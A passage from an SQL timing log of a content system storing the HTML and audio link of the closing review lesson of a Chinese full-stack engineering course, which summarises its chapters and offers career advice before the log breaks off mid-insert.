data-first-offset="true"><span data-slate-string="true">接着是数据一致性，我介绍了它的概念，还有围绕它而产生的常见架构技术。有了数据一致性的基础知识，我们就进一步学习了 
CAP 的原理，包括它的本质、常见的误区，以及我们该怎样根据 CAP 去做技术选型。</span></span></span> </div> <div class="se-b6d1c6e3 
" data-slate-type="paragraph" data-slate-object="block" data-key="986"> <span data-slate-object="text" 
data-key="987"><span data-slate-leaf="true" data-offset-key="987:0" data-first-offset="true"><span 
data-slate-string="true">最后则是数据持久层的设计，包括理论部分、关系数据库和非关系数据库的一些设计要点；以及实例部分，包括几个范例系统：搜索引擎、地理信息系统和电商网站。</span></span></span> 
</div> <h3 class="se-4688dd01" data-slate-type="heading" data-slate-object="block" data-key="988"><span 
data-slate-object="text" data-key="989"><span data-slate-leaf="true" data-offset-key="989:0" 
data-first-offset="true"><span data-slate-string="true">第五章：寻找最佳实践</span></span></span></h3> 
<div class="se-a9c3f076 " data-slate-type="paragraph" data-slate-object="block" data-key="990"> 
<span data-slate-object="text" data-key="991"><span data-slate-leaf="true" data-offset-key="991:0" 
data-first-offset="true"><span data-slate-string="true">在第五章中，我们跳出了全栈技术纵深方向上具体某一层的限制，而是从一个横向的角度去分析相关的实践技术。</span></span></span> 
</div> <div class="se-ff8dfc10 " data-slate-type="paragraph" data-slate-object="block" data-key="992"> 
<span data-slate-object="text" data-key="993"><span data-slate-leaf="true" data-offset-key="993:0" 
data-first-offset="true"><span data-slate-string="true">在 Ops 三部曲中，我分别介绍了：</span></span></span> 
</div> <div class="se-e2b2268d" data-slate-type="list" data-slate-object="block" data-key="994"> 
<div class="se-e673f0a4 se-14e1ba7a" data-slate-type="list-line" data-slate-object="block" 
data-key="995"> <span data-slate-object="text" data-key="996"><span data-slate-leaf="true" 
data-offset-key="996:0" data-first-offset="true"><span data-slate-string="true">配置管理，有哪些配置管理的技术，我们该选择怎样的方式去做配置管理；</span></span></span> 
</div> <div class="se-14cc6eaf se-00479ed7" data-slate-type="list-line" data-slate-object="block" 
data-key="997"> <span data-slate-object="text" data-key="998"><span data-slate-leaf="true" 
data-offset-key="998:0" data-first-offset="true"><span data-slate-string="true">集群部署，我介绍了集群部署的方式，部署下的负载分担原理和策略算法，以及集群部署下常见的话题——Session 
和 Cookie；</span></span></span> </div> <div class="se-2e10591e se-671b3fc9" data-slate-type="list-line" 
data-slate-object="block" data-key="999"> <span data-slate-object="text" data-key="1000"><span 
data-slate-leaf="true" data-offset-key="1000:0" data-first-offset="true"><span data-slate-string="true">测试和发布，围绕 
CI/CD 介绍了 pipeline 的含义、内容和挑战，以及不同类型的测试在其上集成的方式。</span></span></span> </div> </div> <div class="se-3c82a969 
" data-slate-type="paragraph" data-slate-object="block" data-key="1001"> <span data-slate-object="text" 
data-key="1002"><span data-slate-leaf="true" data-offset-key="1002:0" data-first-offset="true"><span 
data-slate-string="true">在网络安全那一讲中，我着重介绍了常见的 Web 攻击方式的原理，包括 XSS、CSRF、SQL 注入、HTTP 和 DNS 劫持，以及 
DDoS。</span></span></span> </div> <div class="se-74eb6730 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1003"> <span data-slate-object="text" data-key="1004"><span data-slate-leaf="true" 
data-offset-key="1004:0" data-first-offset="true"><span data-slate-string="true">最后则是 SEO 这一讲，我介绍了 
SEO 和白帽、黑帽的含义，以及一些常见的 SEO 技术，包括站内优化和站外优化。</span></span></span> </div> <h3 class="se-f171329f" 
data-slate-type="heading" data-slate-object="block" data-key="1005"><span data-slate-object="text" 
data-key="1006"><span data-slate-leaf="true" data-offset-key="1006:0" data-first-offset="true"><span 
data-slate-string="true">第六章：专题</span></span></span></h3> <div class="se-35737743 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1007"> <span data-slate-object="text" data-key="1008"><span 
data-slate-leaf="true" data-offset-key="1008:0" data-first-offset="true"><span data-slate-string="true">在第六章，我选取了四大专题分别展开介绍。</span></span></span> 
</div> <div class="se-acba53a6 " data-slate-type="paragraph" data-slate-object="block" data-key="1009"> 
<span data-slate-object="text" data-key="1010"><span data-slate-leaf="true" data-offset-key="1010:0" 
data-first-offset="true"><span data-slate-string="true">在网站性能优化一讲，首先我介绍了一些基础知识，包括性能优化和软件设计的关系，性能优化的关注点，性能测试和指标，以及寻找性能瓶颈的思路；接着按照产品架构调整、后端和持久层优化，以及前端和网络层优化这样三个部分，分别介绍相应的常见性能优化技术。</span></span></span> 
</div> <div class="se-f3034b0c " data-slate-type="paragraph" data-slate-object="block" data-key="1011"> 
<span data-slate-object="text" data-key="1012"><span data-slate-leaf="true" data-offset-key="1012:0" 
data-first-offset="true"><span data-slate-string="true">在全栈开发中的算法这一讲，我以这样几大场景为主线，介绍了一些重要的算法：</span></span></span> 
</div> <div class="se-a41ce5dd" data-slate-type="list" data-slate-object="block" data-key="1013"> 
<div class="se-fe7ed91f se-9d677a7b" data-slate-type="list-line" data-slate-object="block" 
data-key="1014"> <span data-slate-object="text" data-key="1015"><span data-slate-leaf="true" 
data-offset-key="1015:0" data-first-offset="true"><span data-slate-string="true">流量控制算法，包括基于固定时间窗口和滑动时间窗口的流量控制，漏桶算法和令牌桶算法；</span></span></span> 
</div> <div class="se-00e5b583 se-771effbd" data-slate-type="list-line" data-slate-object="block" 
data-key="1016"> <span data-slate-object="text" data-key="1017"><span data-slate-leaf="true" 
data-offset-key="1017:0" data-first-offset="true"><span data-slate-string="true">Diffie–Hellman 
密钥交换算法，从中我们学到了数学上超大质数在安全领域的一个典型应用；</span></span></span> </div> <div class="se-ee8af567 se-9571a9e2" 
data-slate-type="list-line" data-slate-object="block" data-key="1018"> <span data-slate-object="text" 
data-key="1019"><span data-slate-leaf="true" data-offset-key="1019:0" data-first-offset="true"><span 
data-slate-string="true">数据压缩算法，包括哈夫曼编码、RLE 编码和算术编码，从而帮助我们理解，如今繁多的压缩技术的最基本的原理。</span></span></span> 
</div> </div> <div class="se-7093b0ec " data-slate-type="paragraph" data-slate-object="block" 
data-key="1020"> <span data-slate-object="text" data-key="1021"><span data-slate-leaf="true" 
data-offset-key="1021:0" data-first-offset="true"><span data-slate-string="true">在分页这一讲中，我讲了分页的分类和几种实现分页的技术，最后则是分页的常见问题——重复数据，它背后可能的原因和相应的解决方案。</span></span></span> 
</div> <div class="se-96b37b4e " data-slate-type="paragraph" data-slate-object="block" data-key="1022"> 
<span data-slate-object="text" data-key="1023"><span data-slate-leaf="true" data-offset-key="1023:0" 
data-first-offset="true"><span data-slate-string="true">在最后的 XML、JSON 和 YAML 这一讲，我把这几个数据承载格式的优劣进行了仔细的比较，包括简洁和严谨的程度，与 
JavaScript 的亲和力，schema、转义方式和路径表达式等等。</span></span></span> </div> <h3 class="se-f9868207" data-slate-type="heading" 
data-slate-object="block" data-key="1024"><span data-slate-object="text" data-key="1025"><span 
data-slate-leaf="true" data-offset-key="1025:0" data-first-offset="true"><span data-slate-string="true">其它</span></span></span></h3> 
<div class="se-522f870c " data-slate-type="paragraph" data-slate-object="block" data-key="1026"> 
<span data-slate-object="text" data-key="1027"><span data-slate-leaf="true" data-offset-key="1027:0" 
data-first-offset="true"><span data-slate-string="true">以上是技术方面的“硬通货”，对于非技术方面，我通过特别放送等等的形式，讨论了一些我认为比较重要，尤其是对于 
Web 全栈工程师来说比较重要的话题。</span></span></span> </div> <div class="se-5514c9f0" data-slate-type="list" 
data-slate-object="block" data-key="1028"> <div class="se-acc1206e se-9b366da8" data-slate-type="list-line" 
data-slate-object="block" data-key="1029"> <span data-slate-object="text" data-key="1030"><span 
data-slate-leaf="true" data-offset-key="1030:0" data-first-offset="true"><span data-slate-string="true">怎样去理解 
Web 全栈技术，全栈技术应该怎样学习，需要遵从怎样的学习策略；</span></span></span> </div> <div class="se-1cc2d59d se-cc136f77" 
data-slate-type="list-line" data-slate-object="block" data-key="1031"> <span data-slate-object="text" 
data-key="1032"><span data-slate-leaf="true" data-offset-key="1032:0" data-first-offset="true"><span 
data-slate-string="true">北美全栈工程师的招聘，招人会秉持怎样的理念，整个流程是怎样的；</span></span></span> </div> <div class="se-a09c6af4 
se-62cddb5e" data-slate-type="list-line" data-slate-object="block" data-key="1033"> <span data-slate-object="text" 
data-key="1034"><span data-slate-leaf="true" data-offset-key="1034:0" data-first-offset="true"><span 
data-slate-string="true">技术修炼应该怎样进行取舍和选择，哪些技术应该深挖，哪些则可以点到即止；</span></span></span> </div> <div 
class="se-2a5cc4e9 se-bc442791" data-slate-type="list-line" data-slate-object="block" data-key="1035"> 
<span data-slate-object="text" data-key="1036"><span data-slate-leaf="true" data-offset-key="1036:0" 
data-first-offset="true"><span data-slate-string="true">全栈团队的构成一般是怎样的，有哪些重要的角色；</span></span></span> 
</div> <div class="se-a8549dc1 se-ec9d37f4" data-slate-type="list-line" data-slate-object="block" 
data-key="1037"> <span data-slate-object="text" data-key="1038"><span data-slate-leaf="true" 
data-offset-key="1038:0" data-first-offset="true"><span data-slate-string="true">代码审查为什么不可或缺，有哪些争议和好处，又有哪些技巧；</span></span></span> 
</div> <div class="se-b85846fc se-3fc8908e" data-slate-type="list-line" data-slate-object="block" 
data-key="1039"> <span data-slate-object="text" data-key="1040"><span data-slate-leaf="true" 
data-offset-key="1040:0" data-first-offset="true"><span data-slate-string="true">程序员为什么要学英语，重要性在哪里，又有哪些好办法；</span></span></span> 
</div> <div class="se-e86a0ac9 se-8b4943ad" data-slate-type="list-line" data-slate-object="block" 
data-key="1041"> <span data-slate-object="text" data-key="1042"><span data-slate-leaf="true" 
data-offset-key="1042:0" data-first-offset="true"><span data-slate-string="true">作为 Web 全栈工程师，我们还有哪些发展方向可以考虑，我们为什么需要让项目和团队也“全栈化”？</span></span></span> 
</div> </div> <h2 class="se-968e7cd7" data-slate-type="heading" data-slate-object="block" data-key="1043"><span 
data-slate-object="text" data-key="1044"><span data-slate-leaf="true" data-offset-key="1044:0" 
data-first-offset="true"><span data-slate-string="true">继续提升的重要两步</span></span></span></h2> 
<div class="se-100836cc " data-slate-type="paragraph" data-slate-object="block" data-key="1045"> 
<span data-slate-object="text" data-key="1046"><span data-slate-leaf="true" data-offset-key="1046:0" 
data-first-offset="true"><span data-slate-string="true">对于我们专栏已经覆盖到的这些技能树的枝枝丫丫，我还想特别强调两个方面，这两个方面其实我们已经谈到过了，但是我觉得在今天，我们需要再拿出来稍稍强化一下。因为在我看来，它们有些特殊——它们对于程序员进一步发展至关重要，它们也是“成为更好的全栈工程师”所必须迈出的两步，但是谈论的人却很少。</span></span></span> 
</div> <h3 class="se-025c273f" data-slate-type="heading" data-slate-object="block" data-key="1047"><span 
data-slate-object="text" data-key="1048"><span data-slate-leaf="true" data-offset-key="1048:0" 
data-first-offset="true"><span data-slate-string="true">1. 从做项目到做产品</span></span></span></h3> 
<div class="se-73e5bd13 " data-slate-type="paragraph" data-slate-object="block" data-key="1049"> 
<span data-slate-object="text" data-key="1050"><span data-slate-leaf="true" data-offset-key="1050:0" 
data-first-offset="true"><span data-slate-string="true">你还记得吗？ </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1051" class="se-9a604d3a se-490c3d6a"><span data-slate-object="text" 
data-key="1052"><span data-slate-leaf="true" data-offset-key="1052:0" data-first-offset="true"><span 
data-slate-string="true">[第 28 讲]</span></span></span></a><span data-slate-object="text" data-key="1053"><span 
data-slate-leaf="true" data-offset-key="1053:0" data-first-offset="true"><span data-slate-string="true"> 
的选修课堂，我介绍了程序员独立性的几个阶段，不知道你属于哪一个阶段呢？作为职业生涯进阶的一部分，如果你还停留在“做项目”的阶段，那么你需要在某一天切换到“做产品”的模式上来，完成程序员独立性的升级。事实上，“做项目”，终归只是“做产品”整个过程中很小的一部分，只有对于产品多个阶段的不断地迭代、回馈，程序员很多方面的认识才能不断进化。</span></span></span> 
</div> <div class="se-f6eeb795 " data-slate-type="paragraph" data-slate-object="block" data-key="1054"> 
<span data-slate-object="text" data-key="1055"><span data-slate-leaf="true" data-offset-key="1055:0" 
data-first-offset="true"><span data-slate-string="true">举个例子，对于程序员来说，oncall（定位和修复线上问题）就是“做产品”必经的一环，也是团队“吃自己的狗食”的重要一环。这个过程可以反哺开发阶段，没有这样的过程，就不会真正体会到代码质量的重要性，就不会彻底意识到单元测试的重要性，也不会对代码评审的必要性有深刻的认识。</span></span></span> 
</div> <div class="se-88a38031 " data-slate-type="paragraph" data-slate-object="block" data-key="1056"> 
<span data-slate-object="text" data-key="1057"><span data-slate-leaf="true" data-offset-key="1057:0" 
data-first-offset="true"><span data-slate-string="true">因此，如果你还只有“做项目”的经验，我建议你，在未来给自己寻找做产品的机会。</span></span></span> 
</div> <h3 class="se-7305d892" data-slate-type="heading" data-slate-object="block" data-key="1058"><span 
data-slate-object="text" data-key="1059"><span data-slate-leaf="true" data-offset-key="1059:0" 
data-first-offset="true"><span data-slate-string="true">2. 保持技术上的包容心</span></span></span></h3> 
<div class="se-02fdc4c7 " data-slate-type="paragraph" data-slate-object="block" data-key="1060"> 
<span data-slate-object="text" data-key="1061"><span data-slate-leaf="true" data-offset-key="1061:0" 
data-first-offset="true"><span data-slate-string="true">在 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1062" class="se-9a604d3a se-490c3d6a"><span data-slate-object="text" 
data-key="1063"><span data-slate-leaf="true" data-offset-key="1063:0" data-first-offset="true"><span 
data-slate-string="true">[第 14 讲]</span></span></span></a><span data-slate-object="text" data-key="1064"><span 
data-slate-leaf="true" data-offset-key="1064:0" data-first-offset="true"><span data-slate-string="true"> 
我就谈到过这个给自己“贴标签”的问题，有些程序员工作没几年，无论是有意识还是无意识地，就已经给自己贴上了过于明确的技术分类的标签。</span></span></span> </div> 
<div class="se-9e772ca3 " data-slate-type="paragraph" data-slate-object="block" data-key="1065"> 
<span data-slate-object="text" data-key="1066"><span data-slate-leaf="true" data-offset-key="1066:0" 
data-first-offset="true"><span data-slate-string="true">比如说，给自己贴上“PHP 工程师”的标签，理由是觉得 PHP 是最好的语言，因此求职的时候非 
PHP 的岗位一概不考虑；比如，只想做 Billing 系统，其它的业务领域和项目一概不考虑；再比如，极度强调自己是“技术人”，而特别排斥管理技巧、沟通合作能力等这些被鄙视为“非干货”、“非实战”的内容，可是对于几乎所有的职业生涯技术路线来说，它们其实都是非常重要，且绕不开的槛。</span></span></span> 
</div> <div class="se-4bda2846 " data-slate-type="paragraph" data-slate-object="block" data-key="1067"> 
<span data-slate-object="text" data-key="1068"><span data-slate-leaf="true" data-offset-key="1068:0" 
data-first-offset="true"><span data-slate-string="true">再说说具体的技术，每个人都有偏好，但是不要因为自己的偏好，在技术的选择上失去程序员应有的理性判断，甚至将应当去接纳和学习的技术拒之门外。因为你也不知道哪一天，一个新领域、一门新技术会像浪潮一样涌来，就像几年前的云计算，这两年的区块链。只有那些有着包容心的程序员，才能去接纳和抓住机会。这也正如我在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1069" class="se-9a604d3a 
se-490c3d6a"><span data-slate-object="text" data-key="1070"><span data-slate-leaf="true" data-offset-key="1070:0" 
data-first-offset="true"><span data-slate-string="true">[开篇词]</span></span></span></a><span 
data-slate-object="text" data-key="1071"><span data-slate-leaf="true" data-offset-key="1071:0" 
data-first-offset="true"><span data-slate-string="true"> 中所说的，最终也许我们需要“学得精”，但是一开始我们一定要“学得杂”。</span></span></span> 
</div> <h2 class="se-738cea3a" data-slate-type="heading" data-slate-object="block" data-key="1072"><span 
data-slate-object="text" data-key="1073"><span data-slate-leaf="true" data-offset-key="1073:0" 
data-first-offset="true"><span data-slate-string="true">送君千里，终须一别</span></span></span></h2> 
<div class="se-2a3e61a7 " data-slate-type="paragraph" data-slate-object="block" data-key="1074"> 
<span data-slate-object="text" data-key="1075"><span data-slate-leaf="true" data-offset-key="1075:0" 
data-first-offset="true"><span data-slate-string="true">任何一段旅程都有终点，这个专栏也不例外。</span></span></span> 
</div> <div class="se-6fe3f139 " data-slate-type="paragraph" data-slate-object="block" data-key="1076"> 
<span data-slate-object="text" data-key="1077"><span data-slate-leaf="true" data-offset-key="1077:0" 
data-first-offset="true"><span data-slate-string="true">今天，你学到了这里，我最想大声地和你说一句话——祝贺你！从试读到购买，再到完整学习，我相信你已经一马当先，击败了一些人。现在，我希望你可以继续一马当先，不止在这个专栏，还在你今后的学习、工作和生活中。</span></span></span> 
</div> <div class="se-43602414 " data-slate-type="paragraph" data-slate-object="block" data-key="1078"> 
<span data-slate-object="text" data-key="1079"><span data-slate-leaf="true" data-offset-key="1079:0" 
data-first-offset="true"><span data-slate-string="true">回头看，整个专栏正文部分共计 40 讲，全部加起来有二十多万字。如果在一开始写专栏的时候跟我说，我会做到这个程度，我一定不相信。在这个过程当中，从主题选择、大纲确定、内容试写，到正式写作、绘图、审校、录音，整个过程确实让我颇为疲惫。一篇文章耗时最长的部分并非写作，而是内容选择和构思，比如怎样让你的收获最大化，得到更加通用的原理、套路 
，而不是停留在某个单一的技术表面上。但是，就像我在专栏上线以前想的那样，我觉得这是一件自己可以尽量认真做好的、很有意义的事情。现在看起来，我觉得可以稍微松口气了。</span></span></span> 
</div> <div class="se-006c2d3e " data-slate-type="paragraph" data-slate-object="block" data-key="1080"> 
<span data-slate-object="text" data-key="1081"><span data-slate-leaf="true" data-offset-key="1081:0" 
data-first-offset="true"><span data-slate-string="true">在这里，我要说，感谢你可以阅读这个专栏，并且特别感谢那些积极在留言区交流的朋友，关于全栈的内容，我们还可以继续在留言区沟通，也欢迎你访问我的</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1082" class="se-9a604d3a se-490c3d6a"><span 
data-slate-object="text" data-key="1083"><span data-slate-leaf="true" data-offset-key="1083:0" 
data-first-offset="true"><span data-slate-string="true">个人博客</span></span></span></a><span 
data-slate-object="text" data-key="1084"><span data-slate-leaf="true" data-offset-key="1084:0" 
data-first-offset="true"><span data-slate-string="true">，和我继续交流。</span></span></span> </div> 
<div class="se-a6a94ca4 " data-slate-type="paragraph" data-slate-object="block" data-key="1085"> 
<span data-slate-object="text" data-key="1086"><span data-slate-leaf="true" data-offset-key="1086:0" 
data-first-offset="true"><span data-slate-string="true">世界变化太快，技术发展太快，我们“被迫”成为了全栈工程师。</span></span></span> 
</div> <div class="se-86221bdc " data-slate-type="paragraph" data-slate-object="block" data-key="1087"> 
<span data-slate-object="text" data-key="1088"><span data-slate-leaf="true" data-offset-key="1088:0" 
data-first-offset="true"><span class="se-743dcd75" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">全栈，不只是一种技术分类，还代表了一种态度：理性、包容、好学。</span></span></span></span><span data-slate-object="text" 
data-key="1089"><span data-slate-leaf="true" data-offset-key="1089:0" data-first-offset="true"><span 
data-slate-string="true">希望你可以从这个专栏得到你想要的，但更多的收获，需要你在线下继续努力。毕竟，《全栈工程师修炼指南》这个专栏结束了，而你的全栈之路却才刚刚开始。</span></span></span> 
</div> <div class="se-1b9ef6e9 " data-slate-type="paragraph" data-slate-object="block" data-key="1090"> 
<span data-slate-object="text" data-key="1091"><span data-slate-leaf="true" data-offset-key="1091:0" 
data-first-offset="true"><span data-slate-string="true">好，我是四火，我们后会有期！</span></span></span> 
</div> <div class="se-429fd270 " data-slate-type="paragraph" data-slate-object="block" data-key="1092"> 
<span data-slate-object="text" data-key="1093"><span data-slate-leaf="true" data-offset-key="1093:0" 
data-first-offset="true"><span class="se-7e735c66" data-slate-type="primary" data-slate-object="mark"><span 
data-slate-string="true">最后，文末有一份调查问卷，希望你可以抽出两分钟的时间填写一下。我会认真倾听你对这个专栏的意见或者建议，期待你的反馈！</span></span></span></span> 
</div> <div class="se-ae26b95d" data-slate-type="image" data-slate-object="block" data-key="1094"> 
<a href="https://jinshuju.net/f/514fSy"><img class="se-c1613d83" src="https://static001.geekbang.org/resource/image/3f/3d/3f7b46f38bc0603c33fb4bf299d6763d.jpg"></a> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 3, 3) 
 {executed in 3 msec}
2020-11-19 11:00:26.474 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=3 
 {executed in 0 msec}
2020-11-19 11:00:26.474 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:00:26.476 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=3 
 {executed in 0 msec}
2020-11-19 11:00:26.476 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:00:26.477 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605754826, 1605754826, 1, 'zh-hans', 0, 1, 1, 
0, '全栈回顾丨成为更好的全栈工程师！', 1, 3, 3) 
 {executed in 0 msec}
2020-11-19 11:00:26.482 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=3 
 {executed in 1 msec}
2020-11-19 11:00:26.482 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:00:26.483 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605754826, 1605754826, 1, 'zh-hans', 0, 
1, 1, 0, '全栈回顾丨成为更好的全栈工程师！', 'book', 1, 3, 3) 
 {executed in 0 msec}
2020-11-19 11:00:26.488 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.488 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:00:26.489 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.490 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:00:26.491 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/e7911bdc4h88c3fa4e189d49089c9373?bkt=en-d3a65691252603d3fecc9f504bc78bd2b60e41ea93ecb93ec870c3073148257c8f9b892b6c77d77a&fid=3757516097-778750-696161537579718&time=1605754825&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-3jF%2FfDK8fxD7RsFVAuyD7fUS3Z0%3D&to=92&size=9306649&sta_dx=9306649&sta_cs=1615&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1576766146&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=9306649&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-2b51a744225f8fc2baebef4630c320d905eb2c368996ea591714e9b67466a0c4cc2688fda075116e&sl=76480590&expires=8h&rt=pr&r=809662133&mlogid=7501918660288732089&vbdid=2247232042&fin=%E5%85%A8%E6%A0%88%E5%9B%9E%E9%A1%BE%E4%B8%A8%E6%88%90%E4%B8%BA%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%85%A8%E6%A0%88%E5%B7%A5%E7%A8%8B%E5%B8%88%EF%BC%81.m4a&bflag=92,34-92&rtype=1&dp-logid=7501918660288732089&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=c77a2290e27174be43f6bf90bbc18f8ee19a01257a999ddf305a5e1275657320&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=%E5%85%A8%E6%A0%88%E5%9B%9E%E9%A1%BE%E4%B8%A8%E6%88%90%E4%B8%BA%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%85%A8%E6%A0%88%E5%B7%A5%E7%A8%8B%E5%B8%88%EF%BC%81.m4a', 
3, 3) 
 {executed in 0 msec}
2020-11-19 11:00:26.494 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.495 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:00:26.496 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', 